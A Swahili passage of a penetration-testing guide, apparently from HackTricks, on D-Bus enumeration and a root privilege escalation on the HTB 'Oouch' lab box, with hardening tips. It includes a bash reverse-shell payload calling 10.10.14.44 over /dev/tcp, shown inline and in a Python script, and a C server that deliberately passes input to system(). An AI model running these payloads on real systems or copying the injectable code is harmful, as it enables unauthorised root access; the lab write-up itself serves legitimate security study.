# Uhesabuji wa D-Bus na Kuongezwa kwa Marupurupu kupitia Command Injection

## **Uhesabuji wa GUI**

D-Bus hutumika kama mpatanishi wa mawasiliano kati ya michakato (IPC) katika mazingira ya Ubuntu desktop. Kwenye Ubuntu, kuna message buses kadhaa zinazoendesha kwa wakati mmoja: system bus, inayotumiwa hasa na **privileged services kufichua services zinazohusiana na mfumo mzima**, na session bus kwa kila mtumiaji aliyeingia, inayofichua services zinazohusiana na mtumiaji huyo pekee. Hapa tunazingatia hasa system bus kwa sababu inahusishwa na services zinazoendesha kwa privileges za juu (kwa mfano, root), kwa kuwa lengo letu ni kuongeza privileges. Inabainishwa kuwa usanifu wa D-Bus hutumia 'router' kwa kila session bus, ambayo ina jukumu la kuelekeza ujumbe wa client kwenye services zinazofaa kulingana na address iliyobainishwa na clients kwa service wanayotaka kuwasiliana nayo.<sup>[[1]](#references)</sup>

Services kwenye D-Bus hufafanuliwa na **objects** na **interfaces** wanazofichua. Objects zinaweza kulinganishwa na class instances katika lugha za kawaida za OOP, huku kila instance ikitambuliwa kipekee na **object path**. Path hii, sawa na filesystem path, hutambua kipekee kila object inayofichuliwa na service. Interface muhimu kwa madhumuni ya utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye method moja pekee, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals, na properties zinazoungwa mkono na object; hapa tunazingatia methods huku tukiacha properties na signals.

Kwa mawasiliano na D-Bus interface, zilitumika tools mbili: CLI tool inayoitwa **gdbus**, kwa ajili ya kuita kwa urahisi methods zinazofichuliwa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI tool inayotumia Python iliyoundwa kuhesabu services zinazopatikana kwenye kila bus na kuonyesha objects zilizomo ndani ya kila service.
```bash
sudo apt-get install d-feet
```
Ikiwa unakagua **session bus**, thibitisha anwani ya sasa kwanza:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Katika picha ya kwanza, services zilizosajiliwa kwenye D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa mahususi baada ya kuchagua kitufe cha System Bus. D-Feet huuliza service hii kuhusu objects, na kuonyesha interfaces, methods, properties, na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia imefafanuliwa.

Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** na **command line** ya service, jambo linalofaa kuthibitisha ikiwa service inaendeshwa kwa privileges zilizoinuliwa, ambalo ni muhimu kwa umuhimu wa utafiti.

**D-Feet pia huruhusu method invocation**: watumiaji wanaweza kuingiza Python expressions kama parameters, ambazo D-Feet hubadilisha kuwa D-Bus types kabla ya kuzipitisha kwenye service.

Hata hivyo, kumbuka kwamba **baadhi ya methods zinahitaji authentication** kabla ya kuturuhusu kuzi-invoke. Tutapuuza methods hizi, kwa kuwa lengo letu ni kuinua privileges bila credentials tangu mwanzo.

Pia kumbuka kwamba baadhi ya services huuliza D-Bus service nyingine inayoitwa org.freedeskto.PolicyKit1 ikiwa user anapaswa kuruhusiwa kutekeleza actions fulani au la.

## **Cmd line Enumeration**

### List Service Objects

Inawezekana kuorodhesha interfaces za D-Bus zilizofunguliwa kwa kutumia:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Huduma zilizoalamishwa kama **`(activatable)`** zinavutia hasa kwa sababu **bado hazijaanza kufanya kazi**, lakini ombi la bus linaweza kuzianzisha inapohitajika. Usikome kwenye `busctl list`; linganisha majina hayo na binaries halisi ambazo zingetekelezwa.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Hilo linakuonyesha kwa haraka ni path ipi ya `Exec=` itakayoanzishwa kwa jina linaloweza ku-activate na chini ya identity ipi. Ikiwa binary au execution chain yake imelindwa dhaifu, service isiyotumika bado inaweza kuwa njia ya privilege escalation.

#### Miunganisho

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati process inapoweka connection kwenye bus, bus huipa connection hiyo bus name maalum inayoitwa _unique connection name_. Bus names za aina hii haziwezi kubadilishwa—imehakikishwa kwamba hazitabadilika mradi connection ipo—na, muhimu zaidi, haziwezi kutumiwa tena wakati wa uhai wa bus. Hii inamaanisha kwamba hakuna connection nyingine kwenye bus hiyo itakayowahi kupewa unique connection name hiyo, hata ikiwa process hiyo hiyo itafunga connection kwenye bus na kuunda nyingine mpya. Unique connection names hutambulika kwa urahisi kwa sababu huanza na character ya colon ambayo hairuhusiwi vinginevyo.<sup>[[4]](#references)</sup>

### Maelezo ya Service Object

Kisha, unaweza kupata baadhi ya taarifa kuhusu interface kwa kutumia:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Pia husianisha jina la bus na `systemd` unit yake pamoja na njia ya executable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Hili linajibu swali la kiutendaji linalohusika wakati wa privesc: **ikiwa method call itafaulu, ni binary na unit gani halisi itakayotekeleza kitendo hicho?**

### Orodhesha Interfaces za Service Object

Unahitaji kuwa na permissions za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Kuchunguza Interface ya Service Object

Kumbuka kwamba katika mfano huu ilichaguliwa interface ya hivi karibuni iliyogunduliwa kwa kutumia parameter ya `tree` (_angalia sehemu iliyotangulia_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Zingatia method `.Block` ya interface `htb.oouch.Block` (ile tunayovutiwa nayo). “s” za safu wima nyingine zinaweza kumaanisha kwamba inatarajia string.

Kabla ya kujaribu kitu chochote hatari, thibitisha kwanza method ya **read-oriented** au yenye hatari ndogo kwa njia nyingine. Hii hutenganisha kwa uwazi hali tatu: syntax isiyo sahihi, inaweza kufikiwa lakini imekataliwa, au inaweza kufikiwa na inaruhusiwa.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection hukuambia **unachoweza kuita**, lakini haikuambii **kwa nini** mwito unaruhusiwa au unakataliwa. Kwa privesc triage halisi, kwa kawaida unahitaji kuchunguza **tabaka tatu kwa pamoja**:

1. **Activation metadata** (`.service` files or `SystemdService=`) ili kujua ni binary na unit gani zitakazoendeshwa.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kujua ni nani anayeweza `own`, `send_destination`, au `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) ili kujua authorization model chaguomsingi (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Amri muhimu:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Usidhani kuwa kuna ulinganifu wa 1:1 kati ya method ya D-Bus na action ya Polkit. Method hiyo hiyo inaweza kuchagua action tofauti kulingana na object inayorekebishwa au muktadha wa wakati wa utekelezaji. Kwa hiyo workflow ya vitendo ni:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` na grep kwenye mafaili husika ya `.policy`
3. probes za moja kwa moja zenye hatari ndogo kwa kutumia `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`

Huduma za Proxy au compatibility zinahitaji uangalizi wa ziada. **Proxy inayoendeshwa na root** ambayo inapeleka maombi kwenye huduma nyingine ya D-Bus kupitia connection yake iliyoanzishwa awali inaweza kuifanya backend ichukulie kila ombi kuwa linatoka kwa UID 0 kwa bahati mbaya, isipokuwa utambulisho wa caller wa awali uthibitishwe tena.<sup>[[3]](#references)</sup>

### Interface ya Monitor/Capture

Ukiwa na privileges za kutosha (privileges za `send_destination` na `receive_sender` pekee hazitoshi) unaweza **kufuatilia mawasiliano ya D-Bus**.

Ili **kufuatilia** **mawasiliano**, utahitaji kuwa **root.** Ikiwa bado unapata matatizo ukiwa root, angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ikiwa unajua jinsi ya kusanidi faili ya config ya D-Bus ili **kuruhusu users wasio root kunusa** mawasiliano, tafadhali **wasiliana nami**!

Njia tofauti za kufuatilia:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" hutumwa kutokana na kutokuelewana**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Unaweza kutumia `capture` badala ya `monitor` ili kuhifadhi matokeo katika faili ya **pcapng** ambayo Wireshark inaweza kufungua:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Sheria nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _mojawapo_ ya sheria, ujumbe huo utachapishwa. Kama ifuatavyo:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Tazama [nyaraka za D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya match rule.<sup>[[7]](#references)</sup>

### Zaidi

`busctl` ina options hata zaidi, [**zipate zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali Inayoweza Kuathiriwa**

Ukiwa kama user **qtc ndani ya host "oouch" kutoka HTB**, unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Kumbuka kutoka kwenye usanidi wa awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Kama mtumiaji **qtc** ndani ya docker container **aeb4525789d8**, unaweza kupata code inayohusiana na dbus kwenye faili _/code/oouch/routes.py._ Hii ndiyo code muhimu:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, **inaunganisha kwenye D-Bus interface** na kutuma "client_ip" kwenye **"Block" function**.

Upande mwingine wa muunganisho wa D-Bus kuna binary fulani ya C iliyocompile inayoendesha. Code hii **inasikiliza** kwenye muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia `system` function** ili kuzuia anwani ya IP iliyotolewa.\
**Mwitio wa `system` una hatari kwa makusudi ya command injection**, kwa hivyo payload kama ifuatayo itaunda reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Itumie

Mwishoni mwa ukurasa huu unaweza kupata **C code kamili ya D-Bus application**. Ndani yake unaweza kupata kati ya mistari ya 91-97 **jinsi `D-Bus object path`** **na `interface name`** zilivyosajiliwa. Taarifa hii itahitajika kutuma taarifa kwenye muunganisho wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kuona kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo maana katika sehemu inayofuata payloads zitatumwa kwa service object `htb.oouch.Block`, interface `/htb/oouch/Block` na jina la method `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Msimbo ufuatao wa Python utatuma payload kwenye muunganisho wa D-Bus kwa method ya `Block` kupitia `block_iface.Block(runme)` (_kumbuka kuwa ulitolewa kutoka kwenye kipande cha awali cha msimbo_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ni tool inayotumika kutuma message kwenye “Message Bus”
- Message Bus – Ni software inayotumiwa na systems kurahisisha mawasiliano kati ya applications. Inahusiana na Message Queue (messages hupangwa kwa mfuatano) lakini kwenye Message Bus messages hutumwa kwa subscription model na pia kwa haraka sana.
- Tag ya “-system” hutumika kuonyesha kwamba ni system message, si session message (kwa default).
- Tag ya “–print-reply” hutumika kuchapisha message yetu ipasavyo na kupokea replies zozote katika muundo unaoweza kusomeka na binadamu.
- “–dest=Dbus-Interface-Block” Ni address ya Dbus interface.
- “–string:” – Ni type ya message tunayotaka kutuma kwenye interface. Kuna formats kadhaa za kutuma messages kama vile double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma path ya file kwenye Dbus interface. Katika hali hii tunaweza kutumia special file (FIFO) kupitisha command kwenye interface kwa jina la file. “string:;” – Hii ni kuita object path tena mahali tunapoweka FIFO reverse shell file/command.

_Note kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea service object na sehemu ya mwisho (`.Block`) inarejelea method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Zana za Kiotomatiki za Enumeration (2023-2025)

Enumeration ya attack surface kubwa ya D-Bus kwa mikono kwa kutumia `busctl`/`gdbus` huwa ngumu haraka. Zana mbili ndogo za FOSS zilizotolewa katika miaka michache iliyopita zinaweza kuharakisha kazi wakati wa engagements za red-team au CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Imeandikwa kwa C; single static binary (<50 kB) inayopitia kila object path, kuchukua XML ya `Introspect` na kuipangia PID/UID inayomiliki.<sup>[[5]](#references)</sup>
* Flags muhimu:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Zana huweka alama ya `!` kwenye well-known names zisizolindwa, na hivyo kufichua mara moja services unazoweza *own* (kuzichukua) au method calls zinazoweza kufikiwa kutoka kwenye shell isiyo na privileges.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only script inayotafuta paths zenye *writable* katika systemd units **na** D-Bus policy files zenye permissions nyingi kupita kiasi (kwa mfano `send_destination="*"`).<sup>[[6]](#references)</sup>
* Matumizi ya haraka:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Module ya D-Bus hutafuta directories zilizo hapa chini na kuangazia service yoyote inayoweza kufanywa spoof au hijack na user wa kawaida:
* `/etc/dbus-1/system.d/` na `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bugs Mashuhuri za D-Bus Privilege-Escalation (2024-2025)

Kufuatilia CVEs zilizochapishwa hivi karibuni husaidia kutambua patterns kama hizo zisizo salama katika custom code. Mifano miwili mizuri ya hivi karibuni ni:<sup>[[2]](#references)[[3]](#references)</sup>

| Mwaka | CVE | Component | Chanzo Kikuu | Somo la Offensive |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service inayoendeshwa kama root ilifichua D-Bus interface ambayo users wasio na privileges wangeweza kuisanidi upya, ikiwa ni pamoja na kupakia macro behavior inayodhibitiwa na attacker. | Ikiwa daemon inafichua **device/profile/config management** kwenye system bus, chukulia configuration inayoweza kuandikwa na macro features kama code-execution primitives, si "settings" pekee. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy inayoendeshwa kama root ilipeleka requests kwa backend services bila kuhifadhi security context ya caller wa awali, hivyo backends iliichukulia proxy kama UID 0. | Chukulia **proxy / bridge / compatibility** D-Bus services kama bug class tofauti: ikiwa zinasambaza privileged calls, thibitisha jinsi caller UID/Polkit context inavyofikishwa kwenye backend. |

Patterns za kuzingatia:
1. Service inaendeshwa **kama root kwenye system bus**.
2. Aidha hakuna authorization check, au check inafanywa dhidi ya **subject isiyo sahihi**.
3. Method inayoweza kufikiwa hatimaye hubadilisha system state: package install, mabadiliko ya user/group, bootloader config, updates za device profile, file writes, au direct command execution.

Tumia `dbusmap --enable-probes` au `busctl call` ya manual kuthibitisha ikiwa method inaweza kufikiwa, kisha kagua policy XML ya service na Polkit actions ili kuelewa **subject gani** hasa ina-authorizewa.

---

## Hardening & Detection Quick-Wins

* Tafuta policies zilizo world-writable au zilizo wazi kwa *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dai Polkit kwa methods hatari – hata *root* proxies zinapaswa kupitisha PID ya *caller* kwa `polkit_authority_check_authorization_sync()` badala ya PID yao wenyewe.
* Ondoa privileges katika helpers zinazoendelea kwa muda mrefu (tumia `sd_pid_get_owner_uid()` kubadilisha namespaces baada ya kuunganisha kwenye bus).
* Ikiwa huwezi kuondoa service, angalau *scope* kwa Unix group maalum na uzuie access katika XML policy yake.
* Blue-team: capture system bus kwa `busctl capture > /var/log/dbus_$(date +%F).pcapng` na ui-import kwenye Wireshark kwa anomaly detection.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation katika Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service inaruhusu configuration kufanywa na user yeyote asiye na privileges](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass katika Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
